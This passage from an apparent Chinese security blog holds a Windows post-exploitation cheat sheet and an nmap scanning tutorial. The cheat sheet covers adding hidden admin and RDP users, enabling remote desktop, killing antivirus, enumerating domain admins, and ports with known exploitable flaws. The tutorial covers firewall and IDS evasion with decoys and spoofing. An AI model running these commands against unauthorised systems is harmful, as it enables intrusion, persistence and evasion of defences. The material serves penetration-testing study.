class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">query user //查看用户登录权限</span><br><span class="line">whoami   //查看当前用户</span><br><span class="line">systeminfo  //查看当前系统版本与补丁信息</span><br><span class="line"></span><br><span class="line">net user q0o0p 12345 /add  //创建新用户</span><br><span class="line">net localgroup administrators q0o0p /add  //把此用户添加到管理员</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; q0o0p /add   //把此用户添加到远程桌面组 3389</span><br><span class="line"></span><br><span class="line">type 1.py //查看文本内容</span><br><span class="line">echo q0o0p&gt;1.txt //将q0o0p写入文件1.txt</span><br><span class="line">copy 1.txt 2.php  //复制文件</span><br><span class="line">rename I:\1.txt 1.bat //将某个路径下的文件重命名</span><br><span class="line">tasklist  //查看所有进程占用的端口</span><br><span class="line">taskkill /im 映像名称.exe /f  //强制结束指定进程,如: taskkill /im QQMusic.exe /f</span><br><span class="line"></span><br><span class="line">netplwiz  //打开用户界面</span><br><span class="line">//切换用户登录</span><br><span class="line">runas /user:administrator cmd</span><br><span class="line">//将用户提升为管理员</span><br><span class="line">net localgroup administrators q0o0p /add  </span><br><span class="line"></span><br><span class="line">//查看端口的进程</span><br><span class="line">netstat -ano |findstr &quot;1001&quot; //查看1001对应的进程号</span><br></pre></td></tr></table></figure><hr><h2 id="0x03-远程桌面开启指令"><a href="#0x03-远程桌面开启指令" class="headerlink" title="0x03 远程桌面开启指令"></a>0x03 远程桌面开启指令</h2><p>windows系统开启查询远程桌面（mstsc/rdesktop）</p><p>（1）XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）：</p><pre><code>            REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f                                      </code></pre><p>（2）Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）：</p><pre><code>            wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1         </code></pre><p>（3）Winserver2008/2012/Win2k3/win7：</p><pre><code>            wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1                                   </code></pre><p>（4）Winserver2008/2012/：</p><pre><code>            wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1                   </code></pre><p>（5）XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）：</p><pre><code>            meterpreter&gt; run getgui -e</code></pre><p>以下脚本或模块可以开启3389远程桌面端口、创建管理员账户密码、禁用远程桌面(TCP-In)防火墙入站规则。</p><pre><code>            /usr/share/metasploit-framework/scripts/meterpreter/getgui.rb            /usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</code></pre><hr><h2 id="0x04-常用端口及服务"><a href="#0x04-常用端口及服务" class="headerlink" title="0x04 常用端口及服务"></a>0x04 常用端口及服务</h2><p>数据库类端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MSSQL：       1433</span><br><span class="line">Oracle：      1521</span><br><span class="line">MYSQL：       3306</span><br><span class="line">PostgreSQL:   5432</span><br></pre></td></tr></table></figure><p>特殊服务类：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SSL(心脏滴血)：443</span><br><span class="line">MS08067、MS110568、MS17010：445</span><br><span class="line">Rsync(未授权)：873</span><br><span class="line">CouchDB：      5984</span><br><span class="line">redis(未授权)：6379</span><br><span class="line">WebLogic(弱口令、反序列化)：7001/7002</span><br><span class="line">memcache（未授权）：11211</span><br><span class="line">Mongodb(未授权)：27017/27018</span><br><span class="line">SAP(命令执行)：50000</span><br><span class="line">hadoop(未授权)：50070、50030</span><br></pre></td></tr></table></figure><p>远程连接端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ftp：   21</span><br><span class="line">ssh：   22</span><br><span class="line">telnet: 23</span><br><span class="line">SMB(弱口令):445</span><br><span class="line">路由(zebra)：2601/2604</span><br><span class="line">远程桌面：3389 (0708)</span><br></pre></td></tr></table></figure><hr><p>转发： <a href="https://mp.weixin.qq.com/s/8vt1HsqV5b1H0xMkUK4CiA">https://mp.weixin.qq.com/s/8vt1HsqV5b1H0xMkUK4CiA</a></p><h2 id="0x05-常用系统指令"><a href="#0x05-常用系统指令" class="headerlink" title="0x05 常用系统指令"></a>0x05 常用系统指令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">dir           //查看当前目录和子目录</span><br><span class="line">tree          //以图形模式显示驱动器或路径的目录结构</span><br><span class="line">mkdir         创建目录</span><br><span class="line">md           创建文件夹</span><br><span class="line">rd           删除文件夹</span><br><span class="line">move          将文件从一个目录转移到另一个目录</span><br><span class="line"><span class="built_in">type</span>         显示文本文件内容</span><br><span class="line">copy          复制文件</span><br><span class="line"></span><br><span class="line">del          删除文件</span><br><span class="line"></span><br><span class="line">quser         查看当前登陆的用户</span><br><span class="line"></span><br><span class="line">rename /ren     重命名文件/文件夹</span><br><span class="line"></span><br><span class="line">ipconfig /all    获取ip地址 所在域    linux：ifconfig -a</span><br><span class="line"></span><br><span class="line">Route <span class="built_in">print</span>      路由信息</span><br><span class="line"></span><br><span class="line">Arp -a        arp缓存</span><br><span class="line"></span><br><span class="line">Netsh firewall show config  查看防火墙规则</span><br><span class="line"></span><br><span class="line">Netsh firewall show state  </span><br><span class="line"></span><br><span class="line">Netstat -an   获取端口信息</span><br><span class="line"></span><br><span class="line">Whoami        当前用户权限</span><br><span class="line"></span><br><span class="line">Hostname      主机名称</span><br><span class="line"></span><br><span class="line">Set           环境变量</span><br><span class="line"></span><br><span class="line">Query user    查看远程终端在线用户</span><br><span class="line"></span><br><span class="line">Systeminfo    获取操作系统版本、类型、位数等相关信息、安装；</span><br><span class="line"></span><br><span class="line">tasklist \svc</span><br><span class="line"></span><br><span class="line">netstat -an | findstr <span class="string">&quot;LISTENING&quot;</span></span><br><span class="line"></span><br><span class="line">· -b：      显示包含于常见每个链接或监听端口的可执行组件；</span><br><span class="line"></span><br><span class="line">· -o：      显示与每个连接相关的所属进程ID；</span><br><span class="line"></span><br><span class="line">· -v：       与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件；</span><br><span class="line"></span><br><span class="line">Netstat -anb  进程号、端口开放情况、开放端口程序、监听端口组件</span><br><span class="line"></span><br><span class="line">Netsata -ano  tcp/udp协议信息、端口、进程号</span><br><span class="line"></span><br><span class="line">Netstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等</span><br><span class="line"></span><br><span class="line">Tasklist /svc          获取运行的进程名称、服务、PID</span><br><span class="line"></span><br><span class="line">Driverquery            查看已安装驱动程序列表</span><br><span class="line"></span><br><span class="line">Net start              查看已经启动的windows服务</span><br><span class="line"></span><br><span class="line">Msinfo32               获取更加详细的信息</span><br><span class="line"></span><br><span class="line">Taskkill               是windows自带的终止进程程序</span><br><span class="line"></span><br><span class="line">TASKKILL [/S system [/U username [/P [password]]]]&#123; [/FI filter] [/PID processid | /IM imagename] &#125; [/T] [/F]</span><br><span class="line"></span><br><span class="line">例如：taskkill /pid 452 /f        taskkill /im 360tray /f</span><br><span class="line"></span><br><span class="line">用户管理命令：</span><br><span class="line"></span><br><span class="line">Net user hack 123 /add  添加hack用户 密码为123</span><br><span class="line"></span><br><span class="line">whoami             查询账号所属权限</span><br><span class="line"></span><br><span class="line">whoami /all          查看sid值密码策略</span><br><span class="line"></span><br><span class="line">net account         查看本地密码策略</span><br><span class="line"></span><br><span class="line">net account /domain    查看域</span><br><span class="line"></span><br><span class="line">netstat -an          网络连接查询</span><br><span class="line"></span><br><span class="line">route <span class="built_in">print</span>         路由打印</span><br><span class="line"></span><br><span class="line">net user            查询本机用户列表</span><br><span class="line"></span><br><span class="line">net session          查看当前会话</span><br><span class="line"></span><br><span class="line">Net start           获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程</span><br><span class="line"></span><br><span class="line">Net stop servicesname   停止服务命</span><br><span class="line"></span><br><span class="line">Net start servicename   开启服务命令</span><br><span class="line"></span><br><span class="line">net share           查看SMB指向的</span><br><span class="line"></span><br><span class="line">net view            查询同一域内机器列表</span><br><span class="line"></span><br><span class="line">net view /domain      查询域列表</span><br><span class="line"></span><br><span class="line">nltest /dclist:bk     查询域控主机名 nltest /dclist:域名</span><br><span class="line"></span><br><span class="line">nltest /domain_trusts   列出域之间的信任关系</span><br><span class="line"></span><br><span class="line">net view /domain:Secwing  查看Secwing域中的列表</span><br><span class="line"></span><br><span class="line">net time /domain       判断主域，主域都做时间列表</span><br><span class="line"></span><br><span class="line">net config workstation   当前登录域</span><br><span class="line"></span><br><span class="line">net group <span class="string">&quot;enterprise admins&quot;</span> /domain  企业管理组</span><br><span class="line"></span><br><span class="line">net user /domain admin@126.com <span class="built_in">test</span> 修改域用户密码(需要域管理员密码)</span><br><span class="line"></span><br><span class="line">net user /domain       查询域用户</span><br><span class="line"></span><br><span class="line">net group /domain       查询域里面的工作组</span><br><span class="line"></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  查询域管理员用户组</span><br><span class="line"></span><br><span class="line">net localgroup administrators /domain  //登录本机的域管理员</span><br><span class="line"></span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain  查看域控制器</span><br><span class="line"></span><br><span class="line">mstsc /admin               远程桌面登录到console会话解决<span class="built_in">hash</span>无法抓取问题</span><br><span class="line"></span><br><span class="line">dsquery computer domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net group <span class="string">&quot;domain computers&quot;</span> /domain   列出该域内所有机器名</span><br><span class="line"></span><br><span class="line">dsquery user domainroot -<span class="built_in">limit</span> 65535 &amp;&amp; net user /domain  列出该域内所有用户名</span><br><span class="line"></span><br><span class="line">dsqery subnet             列出该域内网段划分</span><br><span class="line"></span><br><span class="line">dsqery group &amp;&amp; net group /domain  //列出该域内分组</span><br><span class="line"></span><br><span class="line">dsquery ou                列出该域内组织单位</span><br><span class="line"></span><br><span class="line">dsquery server &amp;&amp; net time /domain    列出该域内域控制器</span><br><span class="line"></span><br><span class="line">net localgroup administrators  //查看本机管理员</span><br><span class="line"></span><br><span class="line">Net localgroup adminnistrators hack /add   添加hack为管理员权限</span><br><span class="line"></span><br><span class="line">Net localgroup adminnistrators    查看当前系统管理员</span><br><span class="line"></span><br><span class="line">Net localgroup “remote desktop users” hack /add   加入远程桌面用户组</span><br><span class="line"></span><br><span class="line">Net user hack     查看指定用户的信息</span><br><span class="line"></span><br><span class="line">Net user guest /active:yes   激活guest用户</span><br><span class="line"></span><br><span class="line">Net user guest 123</span><br></pre></td></tr></table></figure><hr><p>参考:<br>SAM:<br><a href="https://blog.csdn.net/myerror/article/details/180431?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.channel_param">https://blog.csdn.net/myerror/article/details/180431?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.channel_param</a><br><a href="https://blog.csdn.net/u014182497/article/details/51691743?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">https://blog.csdn.net/u014182497/article/details/51691743?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a><br>mimikatz:<br><a href="https://blog.csdn.net/oceanark/article/details/51902386?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">https://blog.csdn.net/oceanark/article/details/51902386?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param</a><br><a href="https://blog.csdn.net/qq_45924653/article/details/108152412">https://blog.csdn.net/qq_45924653/article/details/108152412</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nmap扫描</title>
      <link href="/2019/05/08/web_nmap/"/>
      <url>/2019/05/08/web_nmap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="nmap扫描方式"><a href="#nmap扫描方式" class="headerlink" title="nmap扫描方式"></a>nmap扫描方式</h2><ul><li><p>TCP SYN scanning<br>这是Nmap默认的扫描方式，通常被称作半开放扫描（Half-open scanning）。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽（Filtered）。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p></li><li><p>TCP connect scanning<br>TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。</p></li><li><p>TCP FIN/Xmas/NULL scanning<br>这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。<br>其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。</p></li><li><p>UDP scanning<br>UDP扫描方式用于判断UDP端口的情况。向目标主机的UDP端口发送探测包，如果收到回复“ICMP port unreachable”就说明该端口是关闭的；如果没有收到回复，那说明UDP端口可能是开放的或屏蔽的。因此，通过反向排除法的方式来断定哪些UDP端口是可能出于开放状态。</p></li><li><p>其他方式<br>除上述几种常用的方式之外，Nmap还支持多种其他探测方式。例如使用SCTP INIT/COOKIE-ECHO方式来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型（TCP/UDP/ICMP/SCTP等等）；使用idle scan方式借助僵尸主机（zombie host，也被称为idle host，该主机处于空闲状态并且它的IPID方式为递增。详细实现原理参见：<a href="http://nmap.org/book/idlescan.html%EF%BC%89%E6%9D%A5%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%A8%E4%B8%BB%E6%9C%BA%EF%BC%8C%E8%BE%BE%E5%88%B0%E9%9A%90%E8%94%BD%E8%87%AA%E5%B7%B1%E7%9A%84%E7%9B%AE%E7%9A%84%EF%BC%9B%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8FTP">http://nmap.org/book/idlescan.html）来扫描目标在主机，达到隐蔽自己的目的；或者使用FTP</a> bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐藏自己的身份的目的。</p></li></ul><hr><h2 id="nmap特点"><a href="#nmap特点" class="headerlink" title="nmap特点"></a>nmap特点</h2><ul><li>灵活<br>支持数十种不同的扫描方式，支持多种目标对象的扫描。</li><li>强大<br>Nmap可以用于扫描互联网上大规模的计算机。</li><li>可移植<br>支持主流操作系统：Windows/Linux/Unix/MacOS等等；源码开放，方便移植。</li><li>简单<br>提供默认的操作能覆盖大部分功能，基本端口扫描nmap targetip，全面的扫描nmap –A targetip。</li><li>自由<br>Nmap作为开源软件，在GPL License的范围内可以自由的使用。</li></ul><hr><h2 id="针对什么情况使用哪种扫描"><a href="#针对什么情况使用哪种扫描" class="headerlink" title="针对什么情况使用哪种扫描"></a>针对什么情况使用哪种扫描</h2><ol><li><p>探测域名(scanme.nmap.org)<br>nmap –sn –PE –PS80,135 –PU53 scanme.nmap.org</p></li><li><p>探测局域网内活动主机(扫描局域网192.168.1.100-192.168.1.120范围内哪些IP的主机是活动的。)<br>nmap –sn 192.168.1.100-120</p></li></ol><p>在局域网内，Nmap是通过ARP包来询问IP地址上的主机是否活动的，如果收到ARP回复包，那么说明主机在线。</p><ol start="3"><li><p>版本侦测<br>nmap –sV 192.168.1.100</p></li><li><p>OS侦测<br>nmap –O 192.168.1.100<br>Nmap拥有丰富的系统数据库nmap-os-db，目前可以识别2600多种操作系统与设备类型。<br>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。</p></li></ol><p>Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。<br>分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。<br>将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p><ul><li>OS侦测用法</li><li>O: 指定Nmap进行OS侦测。</li></ul><p>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。</p><p>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。</p><h2 id="其他扫描选项"><a href="#其他扫描选项" class="headerlink" title="其他扫描选项:"></a>其他扫描选项:</h2><p>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。</p><p>-sn: Ping Scan 只进行主机发现，不进行端口扫描。</p><p>-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</p><p>-PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。</p><p>-PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。-PO[protocollist]: 使用IP协议包探测对方主机是否开启。</p><p>-n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。</p><p>–dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS服务器。</p><p>–system-dns: 指定使用系统的DNS服务器</p><p>–traceroute: 追踪每个路由节点</p><p>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。</p><p>  -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。</p><p>  -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。</p><p>  –scanflags <flags>: 定制TCP包的flags。</p><p>  -sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</p><p>  -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。</p><p>  -sO: 使用IP protocol 扫描确定目标机支持的协议类型。</p><p>  -b <FTP relay host>: 使用FTP bounce scan扫描方式</p><h3 id="规避用法"><a href="#规避用法" class="headerlink" title="规避用法"></a>规避用法</h3><p>-f; –mtu <val>: 指定使用分片、指定数据包的MTU.</p><p>-D &lt;decoy1,decoy2[,ME],…&gt;: 用一组IP地址掩盖真实地址，其中ME填入自己的IP地址。</p><p>-S <IP_Address>: 伪装成其他IP地址</p><p>-e <iface>: 使用特定的网络接口</p><p>-g/–source-port <portnum>: 使用指定源端口</p><p>–data-length <num>: 填充随机数据让数据包长度达到Num。</p><p>–ip-options <options>: 使用指定的IP选项来发送数据包。</p><p>–ttl <val>: 设置time-to-live时间。</p><p>–spoof-mac &lt;mac address/prefix/vendor name&gt;: 伪装MAC地址</p><p>–badsum: 使用错误的checksum来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或IDS/IPS）。</p><h3 id="端口参数与扫描顺序"><a href="#端口参数与扫描顺序" class="headerlink" title="端口参数与扫描顺序"></a>端口参数与扫描顺序</h3><p>-p <port ranges>: 扫描指定的端口</p><p>实例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9（其中T代表TCP协议、U代表UDP协议、S代表SCTP协议）</p><p>-F: Fast mode – 快速模式，仅扫描TOP 100的端口</p><p>-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）。</p><p>–top-ports <number>:扫描开放概率最高的number个端口（nmap的作者曾经做过大规模地互联网扫描，以此统计出网络上各种端口可能开放的概率。以此排列出最有可能开放端口的列表，具体可以参见文件：nmap-services。默认情况下，nmap会扫描最有可能的1000个TCP端口）</p><p>–port-ratio <ratio>: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数，让概率大于–port-ratio的端口才被扫</p><hr><h2 id="Nmap通过探测将端口划分为6个状态："><a href="#Nmap通过探测将端口划分为6个状态：" class="headerlink" title="Nmap通过探测将端口划分为6个状态："></a>Nmap通过探测将端口划分为6个状态：</h2><p>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。</p><h2 id="Nmap高级用法"><a href="#Nmap高级用法" class="headerlink" title="Nmap高级用法"></a>Nmap高级用法</h2><h3 id="防火墙-IDS规避"><a href="#防火墙-IDS规避" class="headerlink" title="防火墙/IDS规避"></a>防火墙/IDS规避</h3><p>防火墙与IDS规避为用于绕开防火墙与IDS（入侵检测系统）的检测与屏蔽，以便能够更加详细地发现目标主机的状况。</p><p>Nmap提供了多种规避技巧，通常从两个方面考虑：数据包的变换（Packet Change）与时序变换（Timing Change）。</p><h3 id="规避原理"><a href="#规避原理" class="headerlink" title="规避原理"></a>规避原理</h3><ul><li><p>分片（Fragmentation）<br>将可疑的探测包进行分片处理（例如将TCP包拆分成多个IP包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。</p></li><li><p>IP诱骗（IP decoys）<br>在进行扫描时，将真实IP地址和其他主机的IP地址（其他主机需要在线，否则目标主机将回复大量数据包到不存在的主机，从而实质构成了拒绝服务攻击）混合使用，以此让目标主机的防火墙或IDS追踪检查大量的不同IP地址的数据包，降低其追查到自身的概率。注意，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实IP地址。</p></li><li><p>IP伪装（IP Spoofing）<br>顾名思义，IP伪装即将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机在与之通信。需要注意，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan或匿名代理（如TOR）等网络技术。</p></li><li><p> 指定源端口<br>某些目标主机只允许来自特定端口的数据包通过防火墙。例如FTP服务器配置为：允许源端口为21号的TCP包通过防火墙与FTP服务端通信，但是源端口为其他端口的数据包被屏蔽。所以，在此类情况下，可以指定Nmap将发送的数据包的源端口都设置特定的端口。</p></li><li><p>扫描延时<br>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率（例如，Solaris 系统通常会限制每秒钟只能产生一个ICMP消息回复给UDP扫描），所以，定制该情况下发包的频率和发包延时可以降低目标主机的审查强度、节省网络带宽。</p></li><li><p>其他技术<br>Nmap还提供多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址、使用错误检查和（badchecksum）。</p></li></ul><p>更多信息<a href="http://nmap.org/book/man-bypass-firewalls-ids.html">http://nmap.org/book/man-bypass-firewalls-ids.html</a></p><hr><h2 id="NSE脚本引擎"><a href="#NSE脚本引擎" class="headerlink" title="NSE脚本引擎"></a>NSE脚本引擎</h2><p>NSE脚本引擎（Nmap Scripting Engine）是Nmap最强大最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展Nmap的功能。</p><p>NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含14个类别的350多个脚本。</p><p>NSE的设计初衷主要考虑以下几个方面：</p><p>网络发现（Network Discovery）<br>更加复杂的版本侦测（例如skype软件）<br>漏洞侦测(Vulnerability Detection)<br>后门侦测(Backdoor Detection)<br>漏洞利用(Vulnerability Exploitation)</p><hr><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP（其中ME表示自己IP）；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看详细信息,包括操作系统信息</span><br><span class="line">nmap -sV 192.168.1.124</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 